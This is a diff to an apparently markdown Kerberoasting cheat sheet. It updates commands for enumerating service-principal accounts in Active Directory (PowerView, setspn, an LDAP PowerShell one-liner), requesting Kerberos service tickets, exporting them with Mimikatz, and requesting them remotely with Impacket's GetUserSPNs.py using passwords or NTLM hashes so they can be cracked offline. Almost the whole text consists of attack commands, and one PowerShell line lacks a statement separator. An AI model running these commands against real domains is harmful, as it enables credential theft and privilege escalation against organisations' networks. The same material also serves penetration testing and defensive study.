@@ -9,12 +9,14 @@ Send a request to a TGT for a Kerberos token, dump it from memory, crack it loca
 Vulnerable users in domain
 
 ```
-Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
+Get-NetUser -SPN | select serviceprincipalname    //Powerview
+setspn -T <domain> -Q */*                         //Builtin
+```
 
-get-adobject | Where-Object {$_.serviceprincipalname -ne $null -and $_.distinguishedname -like "*CN=Users*" -and $_.cn -ne "krbtgt"}
-get-adobject -filter {serviceprincipalname -ne $null} -prop serviceprincipalname
+Enumerate with LDAP Powershell module
 
-setspn -T <domain> -Q */*
+```
+$ldapFilter="(&(objectClass=user)(objectCategory=user)(servicePrincipalName=*))";$domain=New-Object System.DirectoryServices.DirectoryEntry;$search=New-Object System.DirectoryServices.DirectorySearcher;$search.SearchRoot=$domain;$search.PageSize=1000;$search.Filter=$ldapFilter;$search.SearchScope="Subtree";$results=$search.FindAll()$Results=foreach($result in $results){$result_entry=$result.GetDirectoryEntry();$result_entry|Select-Object @{Name="Username";Expression={$_.sAMAccountName}},@{Name="SPN";Expression={$_.servicePrincipalName|Select-Object -First 1}}}$Results;
 ```
 
 Enumerate past remote sessions on local machine
@@ -26,8 +28,7 @@ klist
 Request a Service Ticket from the target. The ticket will be stored in memory
 
 ```
-Add-Type -AssemblyName System.IdentityModel  
-New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
+Add-Type -AssemblyName System.IdentityModel;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"
 ```
 
 Dump the SPN ticket using Mimikatz
@@ -40,17 +41,17 @@ kerberos::list /export
 
 ### \*nix machine
 
-Enumerate vulnerable accounts. Requires a valid user and password
+Get a list of SPN users. Requires a valid user and password or NTLM hash to query the DC
 
 ```
-GetUserSPNs.py <domain>/<user>:<pass>            #check user
-GetUserSPNs.py -dc-ip <DC IP> <domain>/<user>    #query the DC
+GetUserSPNs.py -dc-ip <DC IP> <domain>/<user>:<pass> -outputfile <file>
+GetUserSPNs.py -dc-ip <DC IP> -hashes <LM>:<NT> <domain>/<user> -outputfile <file>
 ```
 
 Dump TGT
 
 ```
-GetUserSPNs.py <domain>/<user>:<pass> -request  #dump TGTs of current user
+GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC IP> -request  #dump TGTs of current user
 GetUserSPNs.py -dc-ip <DC IP> <domain>/<user> -request-user <target user> #dump TGTs of target user
 ```
 
